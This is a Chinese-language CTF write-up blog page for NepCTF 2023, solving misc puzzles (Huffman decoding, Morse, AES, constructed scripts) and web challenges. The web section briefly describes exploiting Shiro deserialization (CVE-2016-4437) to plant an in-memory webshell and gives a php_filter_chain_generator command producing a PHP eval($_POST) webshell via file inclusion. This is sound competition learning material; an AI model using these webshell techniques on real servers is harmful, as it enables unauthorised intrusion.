@@ -1,0 +1,1084 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  NepCTF 2023 | Ya1orin
+</title>
+<meta name="description" content="NepCTF 2023 Writeup"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="NepCTF 2023 | Ya1orin" />
+  <meta
+    property="og:description"
+    content="NepCTF 2023 Writeup"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/nepctf-2023/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2023-08-17T09:19:39&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-10T17:17:45&#43;08:00" /><meta property="article:tag" content="CTF" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="NepCTF 2023"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">NepCTF 2023</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#与ai共舞的哈夫曼">与AI共舞的哈夫曼</a></li>
+        <li><a href="#codes">codes</a></li>
+        <li><a href="#陌生的语言">陌生的语言</a></li>
+        <li><a href="#小叮弹钢琴">小叮弹钢琴</a></li>
+        <li><a href="#你也喜欢三月七么">你也喜欢三月七么</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">web</a>
+      <ul>
+        <li><a href="#ezjava_chekin">Ezjava_Chekin</a></li>
+        <li><a href="#ez_include">Ez_include</a></li>
+        <li><a href="#post-crad-for-you">Post Crad For You</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2023-08-17 09:19:39 &#43;0800 CST" itemprop="datePublished"
+      >2023-08-17</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-10</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/writeup"
+      data-aos="zoom-in"
+      >WRITEUP</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="misc">
+<a class="header-anchor" href="#misc"></a>
+MISC
+</h1><h2 id="与ai共舞的哈夫曼">
+<a class="header-anchor" href="#%e4%b8%8eai%e5%85%b1%e8%88%9e%e7%9a%84%e5%93%88%e5%a4%ab%e6%9b%bc"></a>
+与AI共舞的哈夫曼
+</h2><p>将给的代码扔给gpt，发现缺少一段代码，直接让它帮写出来</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decompress</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Read frequency information</span>
+</span></span><span class="line"><span class="cl">        <span class="n">num_symbols</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">frequencies</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_symbols</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">byte</span><span class="p">,</span> <span class="n">freq_bytes</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">freq</span> <span class="o">=</span> <span class="p">(</span><span class="n">freq_bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">freq_bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">freq_bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">freq_bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">frequencies</span><span class="p">[</span><span class="n">byte</span><span class="p">]</span> <span class="o">=</span> <span class="n">freq</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Rebuild Huffman tree</span>
+</span></span><span class="line"><span class="cl">        <span class="n">root</span> <span class="o">=</span> <span class="n">build_huffman_tree</span><span class="p">(</span><span class="n">frequencies</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Read compressed data</span>
+</span></span><span class="line"><span class="cl">        <span class="n">compressed_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bit_string</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="n">byte</span><span class="p">,</span> <span class="s1">&#39;08b&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">compressed_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">current_node</span> <span class="o">=</span> <span class="n">root</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decompressed_data</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">bit_string</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">bit</span> <span class="o">==</span> <span class="s1">&#39;0&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">current_node</span> <span class="o">=</span> <span class="n">current_node</span><span class="o">.</span><span class="n">left</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">current_node</span> <span class="o">=</span> <span class="n">current_node</span><span class="o">.</span><span class="n">right</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">current_node</span><span class="o">.</span><span class="n">char</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">decompressed_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">current_node</span><span class="o">.</span><span class="n">char</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">current_node</span> <span class="o">=</span> <span class="n">root</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">decompressed_data</span><span class="p">))</span>
+</span></span></code></pre></div><h2 id="codes">
+<a class="header-anchor" href="#codes"></a>
+codes
+</h2><p>进去是个C语言的代码执行器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191132561-1398252466.png" alt="image-20240607191130216"></p>
+<p>提示说环境变量里面有flag，尝试打印环境变量</p>
+<p><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">linux下获取系统环境变量</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">arge</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">arge</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">arge</span><span class="o">++</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191149590-996029833.png" alt="image-20240607191146952"></p>
+<h2 id="陌生的语言">
+<a class="header-anchor" href="#%e9%99%8c%e7%94%9f%e7%9a%84%e8%af%ad%e8%a8%80"></a>
+陌生的语言
+</h2><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191202791-843148984.png" alt="image-20240607191159956"></p>
+<p>给了hint：<code>Atsuko Kagari</code></p>
+<p>发现了这是一个动漫：小魔女学园</p>
+<p>了解到这是新月文字和古龙语（我看像鸡脚语）</p>
+<p>百度贴吧找到对照：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191209889-1271665289.png" alt="image-20240607191207420"></p>
+<p><code>HEARTISYOURMAGIC</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191223978-911331837.png" alt="image-20240607191221615"></p>
+<p><code>NEPNEPABELIEVING</code></p>
+<p>拼起来</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}
+</span></span></code></pre></div><h2 id="小叮弹钢琴">
+<a class="header-anchor" href="#%e5%b0%8f%e5%8f%ae%e5%bc%b9%e9%92%a2%e7%90%b4"></a>
+小叮弹钢琴
+</h2><p>下载后发现是一段音频，用Audacity打开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191242189-641817492.png" alt="image-20240607191239458"></p>
+<p>发现不是长就是短的，猜测是摩斯密码，一个个对，发现真是，得到提示</p>
+<p><code>you should use this to xor something</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191249141-1826519038.png" alt="image-20240607191246544"></p>
+<p>发现了一段字符串</p>
+<p><code>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</code></p>
+<p>看提示应该是要寻找另一串字符串，尝试与题目给的字符串异或</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191302916-1511626233.png" alt="image-20240607191300598"></p>
+<h2 id="你也喜欢三月七么">
+<a class="header-anchor" href="#%e4%bd%a0%e4%b9%9f%e5%96%9c%e6%ac%a2%e4%b8%89%e6%9c%88%e4%b8%83%e4%b9%88"></a>
+你也喜欢三月七么
+</h2><blockquote>
+<p>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</p>
+<p>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</p>
+<p>三月七：那我们快想想怎么解开这个谜题！</p>
+<p>flag格式:NepCTF{+m+}</p>
+<p>hint:URL为压缩包密码</p>
+</blockquote>
+<p><strong>txt文件：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">salt_lenth= 10 
+</span></span><span class="line"><span class="cl">key_lenth= 16 
+</span></span><span class="line"><span class="cl">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值
+</span></span><span class="line"><span class="cl">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc
+</span></span></code></pre></div><p>题目描述：群名很咸，<code>salt</code>（长度为10），因为加了NepCTF的QQ群，发现群名<code>NepCTF2023</code>正好长度为十，推测<code>salt：NepCTF2023</code></p>
+<p>经过啥256处理一下才能得到我们需要的关键：推出sha256后得到key(关键)</p>
+<p>猜测我们对<code>NepCTF2023</code>经过sha256后可以得到<code>key</code> ，取出前32位：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">dd8e671df3882c5be6423cd030bd7cb6
+</span></span></code></pre></div><p>然后AES解密=&gt;hex解密=&gt;base64解密：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191320995-2136655502.png" alt="image-20240607191318564"></p>
+<p><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191335428-165194366.png" alt="image-20240607191333168"></p>
+<p><strong>星穹铁道文字：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191342624-545869757.png" alt="image-20240607191340302"></p>
+<p><strong>翻译一下：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">NepCTF{HRP_always_likes_March_7th}
+</span></span></code></pre></div><h1 id="web">
+<a class="header-anchor" href="#web"></a>
+web
+</h1><h2 id="ezjava_chekin">
+<a class="header-anchor" href="#ezjava_chekin"></a>
+Ezjava_Chekin
+</h2><p><a href="https://blog.csdn.net/dreamthe/article/details/124390531?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=shiro_attack-4.7.0-SNAPSHOT-al&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124390531.142%5ev92%5ekoosearch_v1&amp;spm=1018.2226.3001.4187">详细shiro漏洞复现及利用方法（CVE-2016-4437）</a></p>
+<p>直接利用shiro反序列化工具一把梭</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191401318-584320209.png" alt="image-20240607191359010"></p>
+<p>注入内存马（换jsp类型）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191411410-747375604.png" alt="image-20240607191409148"></p>
+<p>连接成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191416770-1165957202.png" alt="image-20240607191414424"></p>
+<p>查看start.sh</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191422311-1273897623.png" alt="image-20240607191420079"></p>
+<h2 id="ez_include">
+<a class="header-anchor" href="#ez_include"></a>
+Ez_include
+</h2><p>进入页面，有如下界面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191442495-1317549732.png" alt="image-20240607191440315"></p>
+<p>将<code>?</code>后面的内容删去后方访问：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191450697-526892477.png" alt="image-20240607191448460"></p>
+<p>提示让我们访问<code>/jump.php?hint</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191457513-892001261.png" alt="image-20240607191455085"></p>
+<p>发现这是一个文件包含，且加后缀<code>.txt</code>，在注释里提示可以访问<code>hint.ini</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191503283-697759397.png" alt="image-20240607191501073"></p>
+<p>发现远程文件包含利用不了，提示里有一篇文章：https://tttang.com/archive/1395/</p>
+<p>可以在github上找到利用脚本：https://github.com/synacktiv/php_filter_chain_generator</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python3 php_filter_chain_generator.py --chain <span class="s2">&#34;&lt;?php eval(</span><span class="nv">$_POST</span><span class="s2">[1]);?&gt;&#34;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240607191514739-1208798047.png" alt="image-20240607191512382"></p>
+<p>这样就成功了</p>
